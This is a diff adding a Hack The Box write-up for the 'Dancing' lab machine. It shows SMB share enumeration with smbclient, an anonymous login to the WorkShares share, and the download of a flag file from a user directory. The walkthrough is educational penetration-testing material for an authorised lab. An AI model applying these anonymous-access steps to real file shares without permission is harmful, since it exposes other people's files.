@@ -1,0 +1,213 @@
+# Hack The Box — Dancing Write-up
+
+## Machine Information
+
+| Machine | Difficulty | OS | IP |
+|--------|------------|----|----|
+| Dancing | Very Easy | Windows | 10.129.1.12 |
+
+---
+
+# Overview
+
+The **Dancing** machine from Hack The Box Starting Point focuses on basic SMB enumeration.  
+The objective is to identify accessible SMB shares and explore them to locate sensitive files.
+
+This machine demonstrates a common misconfiguration where a Windows file share allows anonymous access, enabling attackers to browse directories and download files.
+
+---
+
+# Lab Environment
+
+Attacker Machine: Kali Linux
+
+Tools Used:
+
+- OpenVPN
+- smbclient
+- ping
+
+---
+
+# Step 1 — Connect to Hack The Box VPN
+
+First connect to the Hack The Box network.
+
+```bash
+sudo openvpn your_vpn_file.ovpn
+```
+
+Successful connection will display:
+
+```
+Initialization Sequence Completed
+```
+
+---
+
+# Step 2 — Verify Connectivity
+
+Check if the target machine is reachable.
+
+```bash
+ping 10.129.1.12
+```
+
+If the machine replies, the VPN connection is working correctly.
+
+---
+
+# Step 3 — SMB Enumeration
+
+Enumerate available SMB shares.
+
+```bash
+smbclient -L 10.129.1.12
+```
+
+Example output:
+
+```
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+WorkShares      Disk
+```
+
+The interesting share discovered is:
+
+```
+WorkShares
+```
+
+---
+
+# Step 4 — Access the Share
+
+Attempt anonymous login.
+
+```bash
+smbclient //10.129.1.12/WorkShares -N
+```
+
+If successful, you will enter the SMB shell.
+
+```
+smb: \>
+```
+
+---
+
+# Step 5 — Enumerate the Share
+
+List directory contents.
+
+```bash
+ls
+```
+
+Output:
+
+```
+Amy.J
+James.P
+```
+
+These are user directories.
+
+---
+
+# Step 6 — Explore Directories
+
+Navigate into the first directory.
+
+```bash
+cd Amy.J
+ls
+```
+
+Output:
+
+```
+worknotes.txt
+```
+
+Return to the previous directory.
+
+```bash
+cd ..
+```
+
+Next, explore the second directory.
+
+```bash
+cd James.P
+ls
+```
+
+Output:
+
+```
+flag.txt
+```
+
+---
+
+# Step 7 — Download the Flag
+
+Retrieve the file.
+
+```bash
+get flag.txt
+```
+
+The file is downloaded to the local machine.
+
+---
+
+# Step 8 — Read the Flag
+
+Exit smbclient.
+
+```bash
+exit
+```
+
+Display the flag.
+
+```bash
+cat flag.txt
+```
+
+---
+
+# Vulnerability
+
+The vulnerability exploited in this machine is:
+
+**Misconfigured SMB Share**
+
+The SMB server allows anonymous users to access shared directories containing user files. This misconfiguration can expose sensitive information.
+
+---
+
+# Key Takeaways
+
+- SMB enumeration is an important step in penetration testing.
+- Anonymous SMB shares often contain sensitive files.
+- Misconfigured file shares can lead to data exposure.
+
+---
+
+# Attack Path Summary
+
+1. Connect to Hack The Box VPN  
+2. Verify connectivity with the target  
+3. Enumerate SMB shares using `smbclient -L`  
+4. Discover the `WorkShares` share  
+5. Access the share anonymously  
+6. Explore user directories  
+7. Download `flag.txt`  
+8. Read the flag
